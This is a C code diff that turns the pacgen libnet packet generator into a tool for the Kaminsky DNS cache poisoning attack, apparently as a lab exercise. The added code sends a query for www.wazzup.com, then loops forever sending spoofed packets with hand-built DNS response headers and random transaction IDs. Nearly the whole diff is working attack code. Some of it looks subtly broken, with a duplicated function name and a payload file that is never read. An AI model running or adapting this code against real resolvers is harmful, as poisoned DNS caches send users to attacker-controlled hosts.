@@ -139,7 +139,126 @@ main(int argc, char *argv[])
 	load_tcp_udp();
 	load_ip();
 	convert_proto();
+	
+	query();
+	attack();
+	
+}
 
+query(){
+
+	load_ethernet_k();
+	load_tcp_udp_k();
+	load_ip_k();
+
+
+
+l = libnet_init(
+			LIBNET_LINK,                             /* injection type */
+			/*            NULL, */                                   /* network interface eth0, eth1, etc. NULL is default.*/
+			MY_PORT,                                /* network interface eth0, eth1, etc. NULL is default.*/
+			errbuf);                                 /* error buffer */
+
+	if (l == NULL)
+	{
+		fprintf(stderr, "libnet_init() failed: %s", errbuf);
+		exit(EXIT_FAILURE); 
+	}
+
+
+
+    	/*
+     	 * DNS payload used for Kaminsky attack
+     	 */
+	
+	load_payload_k();
+
+	if(ip_proto_val==IPPROTO_TCP){    
+		t = libnet_build_tcp(
+				t_src_port,                                    /* source port */
+				t_des_port,                                    /* destination port */
+				t_seq,                                         /* sequence number */
+				t_ack,                                         /* acknowledgement num */
+				t_control_val,                                 /* control flags */
+				t_win,                                         /* window size */
+				0,                                             /* checksum */
+				t_urgent,                                      /* urgent pointer */
+				LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
+				payload_location,                              /* payload */
+				payload_filesize,                              /* payload size */
+				l,                                             /* libnet handle */
+				0);                                            /* libnet id */
+
+		head_type = LIBNET_TCP_H;
+
+		if (t == -1)
+		{
+			fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
+			return (EXIT_FAILURE);
+		}
+
+	}
+
+	if(ip_proto_val==IPPROTO_UDP){
+		t = libnet_build_udp(
+				t_src_port,                                /* source port */
+				t_des_port,                                /* destination port */
+				LIBNET_UDP_H + payload_filesize,           /* packet length */
+				0,                                         /* checksum */
+				payload_location,                          /* payload */
+				payload_filesize,                          /* payload size */
+				l,                                         /* libnet handle */
+				0);                                        /* libnet id */
+		head_type = LIBNET_UDP_H;
+		if (t == -1)
+		{
+			fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
+			return (EXIT_FAILURE);
+		}
+	}
+
+
+	t = libnet_build_ipv4(
+			/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
+			LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
+			i_ttos_val,                                            /* TOS */
+			i_id,                                                  /* IP ID */
+			i_frag,                                                /* IP Frag */
+			i_ttl,                                                 /* TTL */
+			ip_proto_val,                                          /* protocol */
+			0,                                                     /* checksum */
+			i_src_addr,                                            /* source IP */
+			i_des_addr,                                            /* destination IP */
+			NULL,                                                  /* payload */
+			0,                                                     /* payload size */
+			l,                                                     /* libnet handle */
+			0);                                                    /* libnet id */
+	if (t == -1)
+	{
+		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
+		return (EXIT_FAILURE);
+	}
+
+	t = libnet_build_ethernet(
+			eth_daddr,                                   /* ethernet destination */
+			eth_saddr,                                   /* ethernet source */
+			e_proto_val,                                 /* protocol type */
+			NULL,                                        /* payload */
+			0,                                           /* payload size */
+			l,                                           /* libnet handle */
+			0);                                          /* libnet id */
+	if (t == -1)
+	{
+		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
+		return (EXIT_FAILURE);
+	}
+	c = libnet_write(l);
+
+	printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
+
+	libnet_destroy(l);
+}
+attack(){
 while(1){
 	l = libnet_init(
 			LIBNET_LINK,                             /* injection type */
@@ -269,9 +388,7 @@ while(1){
 	printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
 
 	libnet_destroy(l);
-}
-}
-
+}}
 usage()
 {
     fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
@@ -552,3 +669,214 @@ convert_toscontrol()
 }
 
 /* EOF */
+
+
+
+
+
+
+
+
+
+
+load_payload_k()
+{
+    struct stat statbuf;
+    int i = 12,k,l,m;
+    int c = 0;
+
+    /* get the file size so we can figure out how much memory to allocate */
+ 
+    stat(payload_file, &statbuf);
+    payload_filesize = statbuf.st_size;
+
+    payload_location = (char *)malloc(payload_filesize * sizeof(char));
+    if (payload_location == 0)
+    {
+        printf("Allocation of memory for payload failed.\n");
+        exit(0); 
+    }
+
+    /* open the file and read it into memory */
+
+    
+
+	/* Generate random number using rand function and generate randomized prefix */
+	unsigned int id = rand();
+		id = id % 65536;	
+
+	printf("transaction id: %d\n",id);
+    payload_location[0] = id/256; payload_location[1] = id%256;
+
+	printf("hex trans id: %X %X\n",payload_location[0],payload_location[1]);
+
+    payload_location[2] = 0x81; payload_location[3] = 0x80;
+    payload_location[4] = 0x00; payload_location[5] = 0x01;
+    payload_location[6] = 0x00; payload_location[7] = 0x01;
+    payload_location[8] = 0x00; payload_location[9] = 0x00;
+    payload_location[10] = 0x00; payload_location[11] = 0x00;
+   
+    payload_filesize += DNS_HEADER_LEN;
+    payload_filesize ++;
+
+
+	char nprefix[] = "www";
+	char name[] = "wazzup";
+	char ndomain[] = "com";
+
+	unsigned int l_p = strlen(nprefix);
+	unsigned int l_n = strlen(name);
+	unsigned int l_d = strlen(ndomain);
+
+	i=12;
+	
+	payload_location[i] = l_p;
+	i++;
+	
+	
+	for(k =0;k<strlen(nprefix);k++){
+		payload_location[i] = nprefix[k];
+		i++;
+	}
+	
+	
+	payload_location[i] = l_n;
+	i++;
+
+	
+	
+	for(l =0;l<strlen(name);l++){
+		payload_location[i] = name[l];
+		i++;
+	}
+
+
+	payload_location[i] = l_d;
+	i++;
+	
+
+
+	for(m =0;m<strlen(ndomain);m++){
+		payload_location[i] = ndomain[m];
+		i++;
+	}
+	
+	payload_location[i] = 0x00;i++; 
+	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;
+	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;
+
+	printf("payload ");
+	for(l=0;l<i;l++){
+	printf("%X ",payload_location[l]);
+	}
+	printf("\n");
+
+	fflush(stdout);
+}
+
+    /* load_ethernet: load ethernet data file into the variables */
+load_ethernet_k()
+{
+    FILE *infile;
+
+    char s_read[40];
+    char d_read[40];
+    char p_read[60];
+    char count_line[40];
+
+    infile = fopen("eth_header_k", "r");
+
+    fgets(s_read, 40, infile);         /*read the source mac*/
+    fgets(d_read, 40, infile);         /*read the destination mac*/
+    fgets(p_read, 60, infile);         /*read the desired protocal*/
+    fgets(count_line, 40, infile);     /*read how many packets to send*/
+
+    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
+    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
+    sscanf(p_read, "proto,%s", &eth_proto);
+    sscanf(count_line, "pktcount,%d", &eth_pktcount);
+
+    fclose(infile);
+}
+
+    /* load_tcp_udp: load TCP or UDP data file into the variables */
+load_tcp_udp()
+{
+    FILE *infile;
+
+    char sport_line[20] = "";
+    char dport_line[20] = "";
+    char seq_line[20] = "";
+    char ack_line[20] = "";
+    char control_line[65] = "";
+    char win_line[20] = "";
+    char urg_line[20] = "";
+
+    infile = fopen("tcp_udp_header_k", "r");
+
+    fgets(sport_line, 15, infile);	/*read the source port*/
+    fgets(dport_line, 15, infile); 	/*read the dest port*/
+    fgets(win_line, 12, infile);	/*read the win num*/
+    fgets(urg_line, 12, infile);	/*read the urg id*/
+    fgets(seq_line, 13, infile);	/*read the seq num*/
+    fgets(ack_line, 13, infile);	/*read the ack id*/
+    fgets(control_line, 63, infile);	/*read the control flags*/
+
+    /* parse the strings and throw the values into the variable */
+
+    sscanf(sport_line, "sport,%d", &t_src_port);
+    sscanf(sport_line, "sport,%d", &udp_src_port);
+    sscanf(dport_line, "dport,%d", &t_des_port);
+    sscanf(dport_line, "dport,%d", &udp_des_port);
+    sscanf(win_line, "win,%d", &t_win);
+    sscanf(urg_line, "urg,%d", &t_urgent);
+    sscanf(seq_line, "seq,%ld", &t_seq);
+    sscanf(ack_line, "ack,%ld", &t_ack);
+    sscanf(control_line, "control,%[^!]", &t_control);
+
+    fclose(infile); /*close the file*/
+}
+
+
+
+    /* load_ip: load IP data file into memory */
+load_ip_k()
+{
+    FILE *infile;
+
+    char proto_line[40] = "";
+    char id_line[40] = "";
+    char frag_line[40] = "";
+    char ttl_line[40] = "";
+    char saddr_line[40] = "";
+    char daddr_line[40] = "";
+    char tos_line[90] = "";
+    char z_zsaddr[40] = "";
+    char z_zdaddr[40] = "";
+    char inter_line[15]="";
+
+    infile = fopen("ip_header_k", "r");
+
+    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
+    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
+    fgets(ttl_line, 10, infile);
+    fgets(saddr_line, 24, infile);
+    fgets(daddr_line, 24, infile);
+    fgets(proto_line, 40, infile);
+    fgets(inter_line, 15, infile);
+    fgets(tos_line, 78, infile);
+    
+    sscanf(id_line, "id,%d", &i_id);
+    sscanf(frag_line, "frag,%d", &i_frag);
+    sscanf(ttl_line, "ttl,%d", &i_ttl);
+    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
+    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
+    sscanf(proto_line, "proto,%s", &ip_proto);
+    sscanf(inter_line, "interval,%d", &nap_time);
+    sscanf(tos_line, "tos,%[^!]", &i_ttos);
+
+    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
+    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
+    
+    fclose(infile);
+}
